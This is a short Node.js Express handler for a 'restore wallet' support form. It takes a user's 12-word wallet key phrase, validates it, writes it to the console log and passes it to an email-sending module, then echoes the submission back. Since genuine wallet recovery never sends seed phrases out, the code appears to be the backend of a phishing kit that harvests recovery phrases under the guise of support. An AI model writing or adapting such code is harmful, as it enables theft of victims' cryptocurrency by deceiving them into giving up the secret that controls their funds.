const restorWalletValidationSchema = require("../validation/restoreWallet");
const sendEmail = require("../emails/restoreWallet");

module.exports = async (req, res) => {
  try {
    const type = req.query.type;

    // 12 word key-phrase
    if (type === "12") {
      // Validate inputss
      const restoreWalletValid = restorWalletValidationSchema.validate(
        req.body
      );
      if (restoreWalletValid.error) {
        return res.status(400).render("support", {
          formSection: type,
          form: req.body,
          alert: { status: "error", message: restoreWalletValid.error.message },
        });
      }

      delete req.body.checkbox;
      console.log(req.body);

      // Send email
      const sentMail = await sendEmail(req.body, type);
      console.log(sentMail);
    }
    res.json(req.body);
  } catch (error) {
    console.log("ERROR RESTORING WALLET");
    console.log(error);
  }
};
